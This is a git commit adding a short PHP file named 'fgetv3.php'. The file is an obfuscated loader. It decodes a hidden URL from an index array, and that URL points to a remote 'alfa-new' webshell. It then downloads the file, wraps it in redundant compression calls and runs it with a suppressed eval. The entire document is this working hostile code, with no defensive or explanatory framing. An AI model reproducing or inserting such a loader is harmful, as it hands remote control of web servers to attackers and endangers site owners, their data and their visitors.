77a5dac9914ab71fc3f1adaafa9a910ac7045278
Haikal Siregar <mininginformation1337@gmail.com>
2024-04-24 14:08:53 +0700

    Create fgetv3.php

---
+++ fgetv3.php
@@ -0,0 +1,20 @@
+<?php
+
+$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
+$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 9, 20, 18, 19, 8, 10, 0, 8, 11, 64, 22, 4, 1, 18, 7, 4, 11, 11, 64, 12, 0, 8, 13, 64, 0, 11, 5, 0, 66, 13, 4, 22, 62, 15, 7, 15];
+$decodedString = '';
+foreach ($indexArray as $index) {
+    $decodedString .= $characters[$index];
+}
+$url = "$decodedString";
+function fetchContent($url) { 
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($content))))));
+}
+$content = gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(fetchContent($url)))))));
+@eval("?>".$content);
+?>
